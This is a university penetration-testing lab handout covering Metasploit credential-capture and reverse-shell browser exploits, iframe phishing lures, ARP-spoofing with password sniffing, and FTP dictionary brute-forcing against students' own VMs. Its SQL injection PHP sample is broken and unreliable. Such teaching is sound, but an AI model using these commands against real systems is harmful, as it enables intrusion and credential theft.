---
id: lab4
title: Lab 4
sidebar_position: 4
description: Lab 4 for Students to Complete and Submit
---

# Lab 4

## Types of Attacks

### Introduction

In the previous lab, you learned how to perform penetration testing on a vulnerable (target) server. You learned how to perform scanning and enumeration, and then ran vulnerability testing software (eg. Metasploit) to gain access to your Windows server.

In this lab, students will learn **other methods of vulnerability testing** to gain access to vulnerable servers:

- This lab will allow students to identify and practice common types of attacks that occur on targeted computer systems.
- First, students will be exposed to **Client-side** attacks (usually initiated by the server's users) including **Malicious web-page Payloads**, and **IP Spoofing** (Man in the Middle) attacks.
- Then, students will focus on **Server-side** attacks such as **Server-side Injection**, and **Password** attacks.

### Objectives

1. Access a server by creating a webpage using the **<iframe\>** tag to redirect a user to a **Metasploit exploit** in order to gain access to the computer system.
2. Understand how **phishing** can be used to have the user inadvertantly activate (trigger) HTML code to access a vulnerable server via a web-browser.
3. Perform **IP Spoofing** (Man in the Middle) attacks in order to obtain useful information between a connect between computers.
4. Access and manipulate a database server to gain access into the targeted server.
5. Use a **password cracking program** to discover and access user accounts, and possibly root access.

### Required Materials (Bring to All Labs)

- **SATA Hard Disk** (in removable disk tray).
- **Lab Logbook (Lab6 Reference Sheet)** (to make notes and observations).

### Prerequisites

- [SEC520 Lab 3](./lab3.md)

### Online Tools and References

- [Metasploit Framework](http://www.ehacking.net/2011/10/metasploit-tutorials-from-beginner-to.html)
- [arpspoof](http://www.irongeek.com/i.php?page=security/arpspoof)
- [xhydra](http://arhodes505.awardspace.us/minituts/xhydra.htm)

### Course Notes

- [odp](http://cs.senecac.on.ca/~fac/sec520/slides/sec520_w7_l1.odp) | [pdf](http://cs.senecac.on.ca/~fac/sec520/slides/sec520_w7_l1.pdf) | [ppt](http://cs.senecac.on.ca/~fac/sec520/slides/sec520_w7_l1.ppt) (Slides: Types of Attacks)
- [Phishing](http://www.youtube.com/watch?v=ZUygX8TBBw0) | [Malicious Payload](http://www.youtube.com/watch?v=PqfZM3Lxrmg) | [IP Spoofing](http://www.youtube.com/watch?v=-hd7XG-b6uk) | [Database Injection](http://www.youtube.com/watch?v=AhTfo6pWBIM) (YouTube Videos)

## Performing Lab 4

**CAUTION!**

Scanning ports and exploiting servers must
require the permission of Server Owner (preferably in writing). Students

must either use their VMs, use the IFS lab (if available), or sign an agreement to use the **Tank** server when practising these computer system intrusion methods.

### Task #1: Web-browser Redirect (Phishing) Attacks

This section will demonstrate the vulnerability of a computer system with one of its weakest links: _Humans_. You will be using the **Metasploit** framework to create an attack on your server that will _exploit_ and _gain access_ to your target machine. You will also learn how you can redirect users to this attack site to deliver the malicious payload to that targeted computer.

**INSTRUCTIONS:**

Metasploit is a very versatile tool for penetration testing. In addition to gaining access to "targeted" computer systems by using the **Armitage** frontend, other strategies such as _lurking_ to gain access (via reverse shell) by redirecting web-browser traffic are also available.

In this section, we will be using the mfs-console to issue commands to exploit via the web-browser. Before we start, we should update our Metasploit Framework. In order to achieve this, we will update the older version of Metasploit that came with our Kali Linux edition with a new version:

**Using The MSF Console**

**msfconsole** is a shell that allows penetration testers to issue commands when working with Metasploit. For example, IFS students in the degree program are expected to perform penetration testing more in the msfconsole than using Metasploit GUIs like Armatage!

We will be running the **msfconsole** command to access the command shell, and setup a typical phishing attack.

1. Login as **root** user, and issue the command: `msfconsole` (ignore error, console should eventually load). If problems persist check to see if the Metasploit server is running.

    - Next, we will be generating an attack payload (code) that can be executed from an html file (via a form button) to gain access to the computer system. Perform the following steps to create this payload (html) file:

2. In the **msfconsole**, issue the following commands:

```bash
  use auxiliary/server/capture/http_basic
  show options
  set REALM Facebook Gateway
  set URIPATH /
  run
```

3. Note the **LOCAL IP ADDRESS**. You will be entering that address in a web-browser on your targeted Windows server.
4. Your attack server (running Metasploit) is now "lurking" until the user enters data in a windows dialog box.

**Disable Internet Explorer Enhanced Security:** In order to demonstrate this attack, we will disable Internet Explorer Enhanced Security. Perform the instructions below to disable this feature.

5. Switch to your vulnerable Windows server, make certain that you are logged in as **Administrator**.
6. Open the **Control Panel**, select **Add or Remove Programs**, select **Add/Remove Windows Components**. Click to select **Internet Explorer Enhanced Security Configuration** and click **Details**. Unclick the checkboxes for admin and all other users and then click **Next**.
7. Login into a regular user account and open a web-browser.
8. Enter the IP ADDRESS for the attack web-site. Enter a username and password when prompted by the dialog box
9. Now, switch to your attack machine (i.e. host), and you should see a notification of the exploit. Where you able to determine the username and password?
10. Did you think it would be harder to exploit a machine in this way?
11. How popular do you think this type of human-based attack is?
12. How can you prevent this type of attack from occurring on a "hardened system"?
13. Record your findings in your lab log-book.

**The Phishing Attack (For Interest Only)**

**WARNING! Only try this for penetration testing on your VMs or on servers that you have permission to perform penetration testing!**

Only You have created a mechanism to gain access to a vulnerable system by using the targeted system's web-browser. All the **penetration tester** needs to do, is to set an **elaborate "trap" to redirect the user to your host's IP_ADDRESS**, disguised as a regular link.

Here is how simple (subtle) it can be:

1. Perform a Google search to use msfconsole to setup a "reverse shell attack" by entering the console commands:

    - use windows/browser/ms10_002_aurora
    - set generic/shell_reverse tcp
    - set LHOST (your attack host IP ADDRESS)
    - set URIPATH /
    - set LPORT 7371
    - set SRVPORT 80
    - exploit

2. Create a "phony" facebook notification for the "targeted" user on the system (this is where the reconnaissance (information gathering) phase comes in handy such as e-mail usernames and facebook accounts.
3. Here is a link to sample HTML code: [Template of e-mail attachment](https://scs.senecac.on.ca/~fac/sec520/labs/email-attachment-template.html.txt)
4. Edit the file to contain the following iframe (that will draw the user to your attack website):

```html
<iframe src="ATTACK_SERVER_IP_ADDRESS" width="100" height="0"> </iframe>
```

5. We could then send this HTML file via an e-mail to the user (in this case masquerading as a facebook notification. You could simulate this attack for demonstration by creating the html file in your Windows server, and load this file with a web-browser (like Internet Explorer).

    - Another approach would be to send a "phony" notification with links to the facebook "login" page with the <iframe\> element.

14. Proceed to Task #2

**Answer the Task #1 observations / questions in your lab log book.**

### Task #2: IP Spoofing (Man in the Middle) Attacks / Packet Sniffing

This section will demonstrate an **IP Spoofing** attack (sometimes referred to as "_arp poisoning_") where the target server is "tricked" into communicating with a server that assumes has the correct MAC address. The attacker can then "**feed packets**" to the destination allowing for an uninterupted session to obtain information such as usernames and passwords.

**INSTRUCTIONS:**

1. We will be using your **Kali Linux** host machine, **Vulnerable Windows VM**, and **Vulnerable Linux VM** for this section.
2. Note the IP Address of your Windows server.
3. Make certain that your Windows machine is running an FTP server. Set up the FTP server to only allow users to access the FTP server by username and password (possibly not required from default installation and startup).
4. For demonstration purposes of this "man in the middle" attack, open a command prompt, and issue the following MS-Windows command:

```bash
ping LINUX_IP_ADDR -t
```

   - You should now see proof of a connection between your vulnerable Windows and Linux servers.

5. Switch to your vulnerable Linux server, open a shell terminal, and note the IP Address of your vulnerable Linux server.
6. Open another shell terminal, and issue the following Linux command to continuously "ping" the Windows server:

```bash
ping WINDOWS_IP_ADDR
```

7. We will now trick the Windows server into thinking that the attack (Kali Linux or "host") server is the destination server.
8. Switch to your Kali Linux (host) server, and open a shell terminal.
9. While in the host (attack) machine, issue the following Linux command:

```bash
sudo arpspoof -t WINDOWS_IP_ADDR LINUX_IP_ADDR
```

10. We need to continue the "man in the middle" attack by now performing the same manuever for the Linux VM. While still in the host (attack) machine, open another shell terminal and issue the following Linux command:

```bash
sudo arpspoof -t LINUX_IP_ADDR_LINUX WINDOWS_IP_ADDR
```

11. Switch to first your vulnerable Windows machine to view the pings. What do you notice? Do the same for your vulnerable Linux machine. Record your findings in your lab log-book.

**Connection Disconnected:** When initionally performing an "IP Spoof", the connection between the machines is temporary broken. In order to re-establish a connection (via the "man in the middle") the attacker must establish **IP FORWARDING**.

12. To complete the "man in the middle" attack, you are required to establish **IP FORWARDING**. Open another shell window in your host (attack) machine, and issue the following Linux command in your attack host:

```bash
sudo su           # login with admin passord
echo 1 > /proc/sys/net/ipv4/ip_forward
```

   - (This means to set IP FORWARDING to "True" or "On")

13. Switch to your vulnerable Windows and Linux machines. Is the connection (using the ping command) re-established? Record your findings in your lab log-book.

**Obtaining Username / Password Information**

One of the main reasons for a **"man in the middle" attack** is to obtain sensitive information such as a username and password for further exploitation. A **Packet Sniffer** is a useful tool when using a "man in the middle attack". Throughout your journey in the area of Internet Security, you will soon learn there is an ambundence of tools, many of which do the same thing (including packet sniffers). For the remainder of this section we will use a packet sniffer tool called **dsniff**.

14. On an available shell terminal on your host (attack) server, and issue the following Linux command:

```bash
dsniff
```

   - (**tip**: Use the command: `find -P . | grep dsniff` to locate dsniff superuser executable)

15. This packet sniffer program will lurk until a user from the Linux VM establishes a connection with the Windows VM FTP SERVER.
16. Switch to your vulnerable Linux server, and establish an FTP connection with the Windows FTP server.

**FTP Doesn't Work / Alternative Arp Posioning Method:** Students have noticed that when using Kali Linux as a host machine for the vulnerable Windows and Linux VMs they experience a problem when using the **arpspoof** command. You can use the **ettercap** command as an alternative command which does not require port forwarding and performs the dsniff command as well. To run the ettercap command, issue the following command: 

```bash
ettercap -T -M arp /// /// -i vboxnet0
```

17. Then switch back to your host (attack) server.
18. What do you notice? Is this information sufficent to logon as a Windows system user? Record your findings in your lab log-book.
19. Return to your vulnerable Linux server, and close the FTP connection with the Windows server.
20. Switch back to your attack server. What information does **dsniff** provide?
21. What steps would a security analyst implement in order to reduce the possibility of a "man in the middle" attack?
22. Record your findings/answers in your lab log-book.
23. Proceed to Task #3

**Answer Task #2 observations / questions in your lab log book.**

### Task #3: Database Injection Attack

**SQL injection attacks** are basically in the form of introducing or "injecting" malicious code via the input (form) for the SQL/MYSQL database, in order to gain access to the backend database. There are many different methods of injection attacks. We will demonstrate a fairly common method of injection attack which exploits a weakness for the MYSQL server (that fail to **sanitize** user input. In this case, the user inserting illegal characters (single quote i) within an established web-based database form.

In this section, we will only expose the student to the concept of an injection attack. **You are NOT required to setup the MYSQL server, or run a SQL injection attack on your vulnerable machines...**

**INSTRUCTIONS:**

1. Study the following PHP code below:

```bash
<?php
	
	$user = $_POST['usr'];
	
	$user = "anything' OR x='x";

  mysql_query("SELECT user,password FROM users WHERE user ' 'anything' or x='x'");
	
?>
```

2. How could this code be incorporated with an HTML document (using a form) to perform a **database injection** attack? Record your answer in your lab log-book.
3. View the associated **YouTube** video in the resources above, and try briefly explained why this type of attack could work. Write your explanation in your lab log-book.
4. Now, make the following editing changes to your saved database form (areas to be changed are displayed in bold, red colour:

```bash
<?php
	
	$user = <span style="color:red;font-weight:bold">mysql_real_escape_string(</span>$_POST['usr']<span style="color:red;font-weight:bold">)</span>;
	
	$user = "anything' OR x='x";
	
  mysql_query("SELECT user,password FROM users WHERE user ' 'anything' or x='x'");
	
?>
```

5. Try to explain how this last editing session prevented this SQL injection attack. Record your observations/answers in your lab log-book.
6. Proceed to Task #4.

**Answer Task #3 observations / questions in your lab log book.**

### Task #4: Password Cracking Attack

In this section, you will learn another technique to crack passwords by obtaining _usernames_ from e-mail addresses, and then running a _password cracking program_ to hopefully gain access to an account on a vulnerable Windows server that contains a weak password. Then, after gaining access to the account, we will then use a series of techniques to gain access to the administrator's account.

**INSTRUCTIONS:**

1. Go to your vulnerable Windows server, create a username called **weak** that contains a very weak password (no special characters, just words that could be contained in a dictionary).
2. How could you obtain usernames (eg. e-mail usernames) for a targetted computer system? (review your labs and notes during the Reconnaissance Phase). Record your answer in your lab log-book.
3. Assuming that you have obtained a username (i.e. username: **weak**) from the reconnaissance phase. We will now be using a tool to gain access to the account on the targeted Windows server.

**Cain Password Dictionary:** A password cracking program requires a dictionary of common passwords. The file **cain.txt** is a popular dictionary of typical or common passwords that can be used to test for weak passwords on a server.

4. We need to download a dictionary file containing many of the weak password combinations to help crack a user's weak password. You can perform a Netsearch in order to save this dictionary as a text file.

    - Here is a link to various password cracking dictionaries: http://www.skullsecurity.org/wiki/index.php/Passwords
    - As root, download the compressed file (cain.txt.bz2) to your **/root** directory.

5. Decompress the file by issuing the following Linux command:

```bash
bunzip2 cain.txt.bz2
```

**xhydra:** xhydra is a graphical frontend of a program that scans open ports, and attempts to crack account passwords that are weak using a dictionary file of potential passwords. Of course, you could have performed this task manually by using **nmap** to scan open ports, and use other password cracking tools (such as **Cain and Able**), but **xhydra** performs these operations automatically.


6. To launch the xhydra application as root (unless you are already in root), issue the following Linux command:

```bash
sudo xhydra
```

7. In the initial application window (ie. **Target** tab), enter the **WINDOWS_IP_ADDR** in the **Target** textbox.
8. Under the **Protocol** list-box, select **ftp**.
9. In the **Output Options** section, check **Be verbose**, and check **Show Attempts**.
10. Move to the next screen by clicking on the **Passwords** tab.
11. In the **Username** section, type the username called **weak**.
12. In the **Password** section, click on the **passwords list** radio button, and then click on the **passwords list text-box** in order to browse to the **/root/cain.txt** dictionary (on your Kali Linux system) that contains common passwords that you downloaded and decompressed.
13. At the bottom of the screen, check **Try login as password**, and click **Try Empty Password**.
14. Click on the **Start** tab, and click on the **Start** button (at the bottom of the screen) to begin the attack.
15. This attack may take several minutes to complete.
16. Check the output from the Password Cracking Attempt. Did it list any usernames and passwords? If so, record the information in your lab log-book.

**Gaining Root Access:** Once a penetration tester has access to a system as an unpriviledged user, there are methods to try to identify and gain access to an administrative account. For example with Linux systems, gaining access to the **/etc/passwd** file to list users with administrative privedges and gaining access to the **/etc/shadow** to attempt a crack the root password hash (via the **John the Ripper** utility).

17. What sort of harm can be done to this organization if the **root** account has been hacked?
18. What sort of password rules should be used to make it harder to penetrate this system?

**Sharpening Your Skills (hackthissite.org)**

If you are interested in practicing or "honing" your penetration skills, there is a site called http://www.hackthissite.org that allows students to play and practice their skills.

**WARNING**: You ARE NOT SAFE in leaving personal information on the site. The owner of this site has served jail-time for FRAUD. There is also the possibility that a member of the hacker community may be able to access your personal information and use it for their personal advantage (at your expense).

You have been warned!

19. Record your findings in your lab log-book.
20. Proceed to the "Completing the Lab".

**Answer Task #4 observations / questions in your lab log book.**

## Completing the Lab

**Arrange evidence for each of these items on your screen, then ask your instructor to review them and sign off on the lab's completion:**

1. Proof of **Windows VM hack from Phishing / Malicious Code.**
2. **Packet Sniffing** information from Linux to Windows FTP connection.
3. Demonstation of **prevention from Data Injection Attack.**
4. Completed Lab 4 notes.

## Preparing for Quizzes

1. Briefly explain the purpose of a **Phishing** Attack. How can phishing relate to using **malicious code**?
2. Define the term **Man in the Middle** attack.
3. Briefly list the steps in a **Database Injection** attack.
4. How can a **dictionary file** be used to crack passwords on a targeted server?
5. What is a **password hash**? How can a _password hash_ be cracked?
6. What can an organization do to prevent passwords on their computer system from being cracked?
